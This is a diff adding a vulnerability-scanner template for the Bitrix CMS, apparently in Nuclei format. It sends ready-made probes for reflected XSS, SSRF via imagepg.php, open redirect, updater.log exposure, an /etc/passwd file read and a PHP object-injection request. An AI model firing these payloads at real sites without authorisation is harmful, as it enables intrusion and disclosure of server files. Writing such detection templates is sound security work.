@@ -1,0 +1,75 @@
+id: bitrix-vulns-core
+
+info:
+  name: Bitrix Core Vulnerability Checks (XSS, Redirects, SSRF, LFD, Infoleak)
+  author: clevergod
+  severity: high
+  tags: bitrix,xss,ssrf,spoofing,redirect,infoleak
+
+requests:
+
+  # Reflected XSS - mobileapp.list (2023-05857)
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&items%5BITEMS%5D%5BID%5D=<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>'
+    matchers:
+      - type: word
+        name: xss-mobileapp
+        words:
+          - "alert(1)"
+
+  # Content Spoofing / SSRF via imagepg
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/tools/imagepg.php?img=//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg'
+    matchers:
+      - type: word
+        name: imagepg-ssrf
+        words:
+          - "fishing.jpg"
+          - "JFIF"
+
+  # Open Redirect via localredirect.php
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/tools/localredirect.php?lang=ru&url=https://example.com/'
+    matchers:
+      - type: regex
+        name: redirect
+        regex:
+          - "Location: https://example.com/?"
+
+  # Infoleak - updater.log
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/modules/updater.log'
+    matchers:
+      - type: word
+        name: updater-log
+        words:
+          - "/bitrix/modules/"
+          - "UpdateSystem"
+
+  # LFI / File Include - virtual_file_system.php
+  - method: GET
+    path:
+      - '{{BaseURL}}/bitrix/tools/virtual_file_system.php?path=/etc/passwd'
+    matchers:
+      - type: word
+        name: lfi-vfs
+        words:
+          - "root:x:0:0:"
+
+  # SSRF/Deserialization - vote/uf.php (basic probe)
+  - method: POST
+    path:
+      - '{{BaseURL}}/bitrix/components/bitrix/vote/uf.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=test&USER_FIELD_NAME=UF_TEST&params=O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+    matchers:
+      - type: status
+        name: uf-object-injection
+        status:
+          - 500
